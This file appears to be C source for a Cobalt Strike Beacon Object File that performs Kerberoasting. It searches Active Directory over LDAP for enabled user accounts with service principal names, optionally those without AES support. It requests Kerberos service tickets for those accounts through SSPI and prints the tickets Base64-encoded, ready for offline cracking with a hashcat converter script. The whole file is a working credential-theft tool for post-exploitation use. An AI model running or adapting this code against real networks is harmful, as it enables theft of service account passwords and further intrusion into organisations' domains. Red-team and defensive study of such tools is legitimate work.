#define SECURITY_WIN32 

#include <windows.h>
#include <activeds.h>
#include <dsgetdc.h>
#include <lm.h>
#include <security.h>

#include "Kerberoast.h"
#include "beacon.h"

#define BUF_SIZE 512

INT iGarbage = 1;
LPSTREAM lpStream = (LPSTREAM)1;

HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
	HRESULT hr = S_OK;
	va_list argList;
	WCHAR chBuffer[1024];
	DWORD dwWritten = 0;

	if (lpStream <= (LPSTREAM)1) {
		hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &lpStream);
		if (FAILED(hr)) {
			return hr;
		}
	}

	va_start(argList, lpwFormat);
	MSVCRT$memset(chBuffer, 0, sizeof(chBuffer));
	if (!MSVCRT$_vsnwprintf_s(chBuffer, _countof(chBuffer), _TRUNCATE, lpwFormat, argList)) {
		hr = E_FAIL;
		goto CleanUp;
	}

	if (FAILED(hr = lpStream->lpVtbl->Write(lpStream, chBuffer, (ULONG)MSVCRT$wcslen(chBuffer) * sizeof(WCHAR), &dwWritten))) {
		goto CleanUp;
	}

CleanUp:

	va_end(argList);
	return hr;
}

VOID BeaconOutputStreamW() {
	STATSTG ssStreamData = { 0 };
	SIZE_T cbSize = 0;
	ULONG cbRead = 0;
	LARGE_INTEGER pos;
	LPWSTR lpwOutput = NULL;

	if (FAILED(lpStream->lpVtbl->Stat(lpStream, &ssStreamData, STATFLAG_NONAME))) {
		return;
	}

	cbSize = ssStreamData.cbSize.LowPart;
	lpwOutput = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
	if (lpwOutput != NULL) {
		pos.QuadPart = 0;
		if (FAILED(lpStream->lpVtbl->Seek(lpStream, pos, STREAM_SEEK_SET, NULL))) {
			goto CleanUp;
		}

		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
			goto CleanUp;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);
	}

CleanUp:

	if (lpStream != NULL) {
		lpStream->lpVtbl->Release(lpStream);
		lpStream = NULL;
	}

	if (lpwOutput != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpwOutput);
	}

	return;
}

void GetFormattedErrMsg(_In_ HRESULT hr) {
    LPWSTR lpwErrorMsg = NULL;

    KERNEL32$FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,  
	NULL,
	(DWORD)hr,
	MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
	(LPWSTR)&lpwErrorMsg,
	0,
	NULL);

	if (lpwErrorMsg != NULL) {
		BeaconPrintf(CALLBACK_ERROR, "HRESULT 0x%08lx: %ls", hr, lpwErrorMsg);
		KERNEL32$LocalFree(lpwErrorMsg);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "HRESULT 0x%08lx", hr);
	}

    return;
}

LPSTR Base64Encode(_In_ LPVOID lpInputData, _In_ DWORD dwDataLen, DWORD dwEncoding, _Out_ DWORD* dwEncodedSize) {
	LPSTR lpB64String = NULL;
	DWORD dwSize = 0;

	*dwEncodedSize = 0;

	if (!CRYPT32$CryptBinaryToStringA((PBYTE)lpInputData, dwDataLen, dwEncoding, NULL, &dwSize)) {
		return NULL;
	}

	lpB64String = (LPSTR)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)dwSize + 1);
	if (lpB64String == NULL) {
		return NULL;
	}

	if (!CRYPT32$CryptBinaryToStringA((PBYTE)lpInputData, dwDataLen, dwEncoding, lpB64String, &dwSize)) {
		return NULL;
	}

	*dwEncodedSize = dwSize;
	return lpB64String;
}

LPSTR Roast(_In_ LPWSTR pszSPN) {
	PBYTE pTicketBuf = NULL;
	LPSTR lpszB64Ticket = NULL;

	HINSTANCE hModule = LoadLibraryA("Secur32.dll");
	if (hModule == NULL) {
		return NULL;
	}

	// Get an SSPI handle.
	CredHandle hCredential;
	TimeStamp tsExpiry;
	SECURITY_STATUS Status = SECUR32$AcquireCredentialsHandleW(
		NULL, 
		MICROSOFT_KERBEROS_NAME,
		SECPKG_CRED_OUTBOUND,
		NULL, NULL,
		NULL, NULL,
		&hCredential,
		&tsExpiry);
	if (Status) {
		return NULL;
	}

	// Create a buffer to hold the TGS ticket (AP-REQ).
	pTicketBuf = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAXTOKENSIZE);
	if (pTicketBuf == NULL) {
		SECUR32$FreeCredentialsHandle(&hCredential);
		goto CleanUp;
	}
	
	CtxtHandle hContext;
	SecBuffer secBuf = { MAXTOKENSIZE, SECBUFFER_TOKEN, pTicketBuf };
	SecBufferDesc secBufDec = { SECBUFFER_VERSION, 1, &secBuf };
	SecBufferDesc* pOutput = &secBufDec;
	PCtxtHandle pCtxHandleOut = &hContext;
	ULONG ulCtxAttrs = 0;

	// Initiate outbound security context from credential handle to acquire a token.
	Status = SECUR32$InitializeSecurityContextW(
		&hCredential, 
		NULL,
		(PSECURITY_STRING)pszSPN,
		ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH,
		0, SECURITY_NATIVE_DREP,
		NULL, 0,
		pCtxHandleOut,
		pOutput,
		&ulCtxAttrs,
		NULL);
	if (pOutput->pBuffers->pvBuffer == NULL) {
		SECUR32$FreeCredentialsHandle(&hCredential);
		goto CleanUp;
	}

	// Free Credential handle
	SECUR32$FreeCredentialsHandle(&hCredential);

	// Encode ticket
	DWORD dwSize = 0;
	lpszB64Ticket = Base64Encode((LPVOID)pOutput->pBuffers->pvBuffer, (DWORD)pOutput->pBuffers->cbBuffer, CRYPT_STRING_BASE64, &dwSize);
	if (lpszB64Ticket == NULL) {
		goto CleanUp;
	}

CleanUp:

	if (pTicketBuf != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTicketBuf);
	}

	return lpszB64Ticket;
}

HRESULT FindSPNs(_In_ IDirectorySearch *pContainerToSearch, _In_ BOOL bListSPNs, _In_ BOOL bExcludeAES, _In_ LPCWSTR lpwFilter) {
	HRESULT hr = S_OK;
	BOOL bResult = FALSE, bRoast = FALSE;
	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)%ls(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*)(sAMAccountName=%ls))";
	LPCWSTR lpwFormatNoListSpn = L"(&(objectClass=user)(objectCategory=person)%ls(!(userAccountControl:1.2.840.113556.1.4.803:=2))(sAMAccountName=%ls))";
	PUSER_INFO pUserInfo = NULL;
	INT iCount = 0;
	DWORD x = 0L;
	LPWSTR pszColumn = NULL;
	ADS_SEARCH_COLUMN col;
	FILETIME filetime;
	SYSTEMTIME systemtime;
	DATE date;
	VARIANT varDate;
	LARGE_INTEGER liValue;

	_FreeADsMem FreeADsMem = (_FreeADsMem)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "FreeADsMem");
	if (FreeADsMem == NULL) {
		return S_FALSE;
	}

	if (!pContainerToSearch) {
		return E_POINTER;
	}

	// Specify subtree search
	ADS_SEARCHPREF_INFO SearchPrefs;
	SearchPrefs.dwSearchPref = ADS_SEARCHPREF_PAGESIZE;
	SearchPrefs.vValue.dwType = ADSTYPE_INTEGER;
	SearchPrefs.vValue.Integer = 1000;
	DWORD dwNumPrefs = 1;

	// Handle used for searching
	ADS_SEARCH_HANDLE hSearch = NULL;

	// Set the search preference
	hr = pContainerToSearch->lpVtbl->SetSearchPreference(pContainerToSearch, &SearchPrefs, dwNumPrefs);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set search preference.\n");
		goto CleanUp;
	}

	// Add the filter.
	if (MSVCRT$_wcsicmp(lpwFilter, L"*") != 0) {
		lpwFormat = lpwFormatNoListSpn;
	}

	if (bExcludeAES) {
		MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, L"(!(msDS-SupportedEncryptionTypes>=8))", lpwFilter);
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAP filter: %ls\n", wcSearchFilter);
	}
	else{
		MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, L"", lpwFilter);
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAP filter: %ls\n", wcSearchFilter);
	}

	pUserInfo = (PUSER_INFO)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_INFO));
	if (pUserInfo == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to allocate UserInfo memory.\n");
		goto CleanUp;
	}

	// Return all properties
	hr = pContainerToSearch->lpVtbl->ExecuteSearch(pContainerToSearch, wcSearchFilter, NULL, -1L, &hSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to execute search.\n");
		goto CleanUp;
	}

	if (SUCCEEDED(hr)) {	
		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data.
		hr = pContainerToSearch->lpVtbl->GetFirstRow(pContainerToSearch, hSearch);
		if (SUCCEEDED(hr)) {
			while (hr != S_ADS_NOMORE_ROWS) {
				// Keep track of count.
				iCount++;

				// Loop through the array of passed column names, print the data for each column
				while (pContainerToSearch->lpVtbl->GetNextColumnName(pContainerToSearch, hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS) {
					hr = pContainerToSearch->lpVtbl->GetColumn(pContainerToSearch, hSearch, pszColumn, &col);
					if (SUCCEEDED(hr)) {
						// Nasty fix for BOF large switch statement crash...
						if (col.dwADsType == ADSTYPE_DN_STRING){
							for (x = 0; x < col.dwNumValues; x++) {
								if (MSVCRT$_wcsicmp(col.pszAttrName, L"memberOf") == 0) {
									MSVCRT$wcscpy_s(pUserInfo->chMemberOf[x], MAX_PATH, col.pADsValues[x].DNString);
								}
							}
							if (MSVCRT$_wcsicmp(col.pszAttrName, L"distinguishedName") == 0) {
								MSVCRT$wcscpy_s(pUserInfo->chDistinguishedName, MAX_PATH, col.pADsValues->CaseIgnoreString);
							}
						}
						else if ((col.dwADsType == ADSTYPE_CASE_EXACT_STRING) ||
							(col.dwADsType == ADSTYPE_CASE_IGNORE_STRING) ||
							(col.dwADsType == ADSTYPE_PRINTABLE_STRING) ||
							(col.dwADsType == ADSTYPE_NUMERIC_STRING) ||
							(col.dwADsType == ADSTYPE_TYPEDNAME) ||
							(col.dwADsType == ADSTYPE_FAXNUMBER) ||
							(col.dwADsType == ADSTYPE_PATH) ||
							(col.dwADsType == ADSTYPE_OBJECT_CLASS)
							)
						{
							BOOL bRoasted = FALSE;
							LPSTR lpszEncTicket = NULL;
							for (x = 0; x < col.dwNumValues; x++) {
								if (MSVCRT$_wcsicmp(col.pszAttrName, L"servicePrincipalName") == 0) {
									MSVCRT$wcscpy_s(pUserInfo->chServicePrincipalName[x], MAX_PATH, col.pADsValues[x].CaseIgnoreString);
									if (!bRoasted && !bListSPNs) {
										lpszEncTicket = Roast(col.pADsValues[x].CaseIgnoreString);
										if (lpszEncTicket != NULL) {
											MSVCRT$strcat_s(pUserInfo->chHash, MAXTOKENSIZE, lpszEncTicket);
											KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpszEncTicket);
											bRoasted = TRUE;
										}
									}
								}
							}

							if (MSVCRT$_wcsicmp(col.pszAttrName, L"name") == 0) {
								MSVCRT$wcscpy_s(pUserInfo->chName, MAX_PATH, col.pADsValues->CaseIgnoreString);
							}
							else if (MSVCRT$_wcsicmp(col.pszAttrName, L"description") == 0) {
								MSVCRT$wcscpy_s(pUserInfo->chDescription, MAX_PATH, col.pADsValues->CaseIgnoreString);
							}
							else if (MSVCRT$_wcsicmp(col.pszAttrName, L"userPrincipalName") == 0) {
								MSVCRT$wcscpy_s(pUserInfo->chuserPrincipalName, MAX_PATH, col.pADsValues->CaseIgnoreString);
							}
							else if (MSVCRT$_wcsicmp(col.pszAttrName, L"sAMAccountName") == 0) {
								MSVCRT$wcscpy_s(pUserInfo->chSamAccountName, MAX_PATH, col.pADsValues->CaseIgnoreString);
							}
						}
						else if ((col.dwADsType == ADSTYPE_BOOLEAN) ||
							(col.dwADsType == ADSTYPE_INTEGER) ||
							(col.dwADsType == ADSTYPE_OCTET_STRING) ||
							(col.dwADsType == ADSTYPE_UTC_TIME)
							)
						{
							for (x = 0; x < col.dwNumValues; x++) {
								systemtime = col.pADsValues[x].UTCTime;
								if (OLEAUT32$SystemTimeToVariantTime(&systemtime, &date) != 0) {
									//Pack in variant.vt
									varDate.vt = VT_DATE;
									varDate.date = date;
									OLEAUT32$VariantChangeType(&varDate, &varDate, VARIANT_NOVALUEPROP, VT_BSTR);

									if (MSVCRT$_wcsicmp(col.pszAttrName, L"whenCreated") == 0) {
										MSVCRT$wcscpy_s(pUserInfo->chWhenCreated, MAX_PATH, varDate.bstrVal);
									}
									else if (MSVCRT$_wcsicmp(col.pszAttrName, L"whenChanged") == 0) {
										MSVCRT$wcscpy_s(pUserInfo->chWhenChanged, MAX_PATH, varDate.bstrVal);
									}
									else {
										OLEAUT32$VariantClear(&varDate);
									}

									OLEAUT32$VariantClear(&varDate);
								}
							}
						}
						else if (col.dwADsType == ADSTYPE_LARGE_INTEGER){
							for (x = 0; x < col.dwNumValues; x++) {
								liValue = col.pADsValues[x].LargeInteger;
								filetime.dwLowDateTime = liValue.LowPart;
								filetime.dwHighDateTime = liValue.HighPart;

								// Check for properties of type LargeInteger that represent time
								// if TRUE, then convert to variant time.
								if ((0 == MSVCRT$_wcsicmp(L"accountExpires", col.pszAttrName)) |
									(0 == MSVCRT$_wcsicmp(L"badPasswordTime", col.pszAttrName)) ||
									(0 == MSVCRT$_wcsicmp(L"lastLogon", col.pszAttrName)) ||
									(0 == MSVCRT$_wcsicmp(L"lastLogoff", col.pszAttrName)) ||
									(0 == MSVCRT$_wcsicmp(L"lockoutTime", col.pszAttrName)) ||
									(0 == MSVCRT$_wcsicmp(L"pwdLastSet", col.pszAttrName))
									)
								{
									// Handle special case for Never Expires where low part is -1
									if (filetime.dwLowDateTime == -1) {
										if (MSVCRT$_wcsicmp(col.pszAttrName, L"accountExpires") == 0) {
											MSVCRT$wcscpy_s(pUserInfo->chAccountExpires, MAX_PATH, L"Never Expires");
										}
									}
									else {
										if (KERNEL32$FileTimeToLocalFileTime(&filetime, &filetime) != 0) {
											if (KERNEL32$FileTimeToSystemTime(&filetime, &systemtime) != 0) {
												if (OLEAUT32$SystemTimeToVariantTime(&systemtime, &date) != 0) {
													// Pack in variant.vt
													varDate.vt = VT_DATE;
													varDate.date = date;
													OLEAUT32$VariantChangeType(&varDate, &varDate, VARIANT_NOVALUEPROP, VT_BSTR);

													if (MSVCRT$_wcsicmp(col.pszAttrName, L"pwdLastSet") == 0) {
														MSVCRT$wcscpy_s(pUserInfo->chPwdLastSet, MAX_PATH, varDate.bstrVal);
													}
													else if (MSVCRT$_wcsicmp(col.pszAttrName, L"lastLogon") == 0) {
														if (MSVCRT$_wcsicmp(varDate.bstrVal, L"1-1-1601 02:00:00") == 0) {
															MSVCRT$wcscpy_s(pUserInfo->chLastLogon, MAX_PATH, L"Never");
														}
														else {
															MSVCRT$wcscpy_s(pUserInfo->chLastLogon, MAX_PATH, varDate.bstrVal);
														}

													}
													else if (MSVCRT$_wcsicmp(col.pszAttrName, L"accountExpires") == 0) {
														if (MSVCRT$_wcsicmp(varDate.bstrVal, L"1-1-1601 02:00:00") == 0) {
															MSVCRT$wcscpy_s(pUserInfo->chAccountExpires, MAX_PATH, L"Never Expires");
														}
														else {
															MSVCRT$wcscpy_s(pUserInfo->chAccountExpires, MAX_PATH, varDate.bstrVal);
														}
													}

													OLEAUT32$VariantClear(&varDate);
												}
											}
										}
									}
								}
							}
						}

						pContainerToSearch->lpVtbl->FreeColumn(pContainerToSearch, &col);
					}

					if (pszColumn != NULL) {
						FreeADsMem(pszColumn);
					}
				}

				if (MSVCRT$_wcsicmp(pUserInfo->chServicePrincipalName[0], L"") != 0) {
					bResult = TRUE;
					BeaconPrintToStreamW(L"[*] sAMAccountName\t: %ls\n", pUserInfo->chSamAccountName);
					BeaconPrintToStreamW(L"[*] description\t\t: %ls\n", pUserInfo->chDescription); 
					BeaconPrintToStreamW(L"[*] distinguishedName\t: %ls\n", pUserInfo->chDistinguishedName);
					BeaconPrintToStreamW(L"[*] whenCreated\t\t: %ls\n", pUserInfo->chWhenCreated);
					BeaconPrintToStreamW(L"[*] whenChanged\t\t: %ls\n", pUserInfo->chWhenChanged);
					BeaconPrintToStreamW(L"[*] pwdLastSet\t\t: %ls\n", pUserInfo->chPwdLastSet);
					BeaconPrintToStreamW(L"[*] accountExpires\t: %ls\n", pUserInfo->chAccountExpires);
					BeaconPrintToStreamW(L"[*] lastLogon\t\t: %ls\n", pUserInfo->chLastLogon);

					BeaconPrintToStreamW(L"[*] memberOf\t\t:\n");
					for (x = 0; x < 250; x++) {
						if (MSVCRT$_wcsicmp(pUserInfo->chMemberOf[x], L"") == 0) {
							break;
						}
						else {
							BeaconPrintToStreamW(L"    -> %ls\n", pUserInfo->chMemberOf[x]);
						}
					}

					BeaconPrintToStreamW(L"[*] servicePrincipalName(s):\n");
					for (x = 0; x < 250; x++) {
						if (MSVCRT$_wcsicmp(pUserInfo->chServicePrincipalName[x], L"") == 0) {
							break;
						}
						else {
							BeaconPrintToStreamW(L"    -> %ls\n", pUserInfo->chServicePrincipalName[x]);
						}
					}
				}

				//Print final Output
				if (MSVCRT$_stricmp(pUserInfo->chHash, "") != 0) {
					bRoast = TRUE;
					BeaconPrintToStreamW(L"[*] Encoded service ticket\t: <copy paste TICKET output to file and decode with TicketToHashcat.py>\n");
				}

				if (bResult) {
					BeaconOutputStreamW();
				}

				if (bRoast) {
					BeaconPrintf(CALLBACK_OUTPUT,
						"<TICKET>\n"
						"sAMAccountName = %ls\n"
						"%hs"
						"</TICKET>\n", pUserInfo->chSamAccountName, pUserInfo->chHash);
				}

				MSVCRT$memset(pUserInfo, 0, sizeof(USER_INFO));

				// Get the next row
				hr = pContainerToSearch->lpVtbl->GetNextRow(pContainerToSearch, hSearch);

			}
		}
		// Close the search handle to clean up
		pContainerToSearch->lpVtbl->CloseSearchHandle(pContainerToSearch, hSearch);
	}

	if (SUCCEEDED(hr) && 0 == iCount) {
		hr = S_FALSE;
	}

CleanUp:
	
	if (pUserInfo != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pUserInfo);
	}

	return hr;
}

HRESULT SearchDirectory(_In_ BOOL bListSPNs, _In_ BOOL bExcludeAES, _In_ LPCWSTR lpwFilter) {
	HRESULT hr = S_OK;
	HINSTANCE hModule = NULL;
	IADs* pRoot = NULL;
	IDirectorySearch* pContainerToSearch = NULL;
	IID IADsIID, IDirectorySearchIID;

	WCHAR wcPathName[BUF_SIZE] = { 0 };
	VARIANT var;

	hModule = LoadLibraryA("Activeds.dll");
	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(hModule, "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return hr;
	}

	// Initialize COM.
	hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr)) {
		goto CleanUp;
	}

	// Resolve IID from GUID string.
	LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
	LPCOLESTR pIDirectorySearchIID = L"{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}";

	hr = OLE32$IIDFromString(pIADsIID, &IADsIID);
	hr = OLE32$IIDFromString(pIDirectorySearchIID, &IDirectorySearchIID);

	// Get rootDSE and the current user's domain container DN.
	hr = ADsOpenObject(L"LDAP://rootDSE",
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		&IADsIID,
		(void**)&pRoot);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get rootDSE.\n");
		goto CleanUp;
	}

	OLEAUT32$VariantInit(&var);
	hr = pRoot->lpVtbl->Get(pRoot, (BSTR)L"defaultNamingContext", &var);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get defaultNamingContext.");
		goto CleanUp;
	}

	MSVCRT$wcscpy_s(wcPathName, _countof(wcPathName), L"LDAP://");
	MSVCRT$wcscat_s(wcPathName, _countof(wcPathName), var.bstrVal);

	hr = ADsOpenObject((LPCWSTR)wcPathName,
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		&IDirectorySearchIID,
		(void**)&pContainerToSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ADsOpenObject failed.\n");
		goto CleanUp;
	}

	hr = FindSPNs(pContainerToSearch, bListSPNs, bExcludeAES, lpwFilter);

CleanUp:

	if (pContainerToSearch != NULL) {
		pContainerToSearch->lpVtbl->Release(pContainerToSearch);
		pContainerToSearch = NULL;
	}

	if(pRoot != NULL){
		pRoot->lpVtbl->Release(pRoot);
		pRoot = NULL;
	}

	OLE32$CoUninitialize();

	return hr;
}

VOID go(IN PCHAR Args, IN ULONG Length) {
	HRESULT hr = S_OK;
	BOOL bListSPNs = FALSE;
	BOOL bExcludeAES = FALSE;
	LPCWSTR lpwArgs = NULL;
	LPCWSTR lpwFilter = NULL;

	// Parse Arguments
	datap parser;
	BeaconDataParse(&parser, Args, Length);

	lpwArgs = (WCHAR*)BeaconDataExtract(&parser, NULL);
	lpwFilter = (WCHAR*)BeaconDataExtract(&parser, NULL);
	if (lpwArgs != NULL && MSVCRT$_wcsicmp(lpwArgs, L"list") == 0) {
		bListSPNs = TRUE;
	}
	else if (lpwArgs != NULL && MSVCRT$_wcsicmp(lpwArgs, L"list-no-aes") == 0) {
		bListSPNs = TRUE;
		bExcludeAES = TRUE;
	}
	else if (lpwArgs != NULL && MSVCRT$_wcsicmp(lpwArgs, L"roast-no-aes") == 0) {
		bExcludeAES = TRUE;
	}
	else if (lpwArgs != NULL && MSVCRT$_wcsicmp(lpwArgs, L"roast") != 0) {
		BeaconPrintf(CALLBACK_ERROR, "Invalid argument, use 'list', 'list-no-aes', 'roast' or 'roast-no-aes' with an optional account (sAMAccountName) filter.\n");
		return;
	}

	if (lpwFilter == NULL) {
		lpwFilter = L"*";
	}

	hr = SearchDirectory(bListSPNs, bExcludeAES, lpwFilter);
	if (FAILED(hr)) {
		GetFormattedErrMsg(hr);
	}

	return;
}
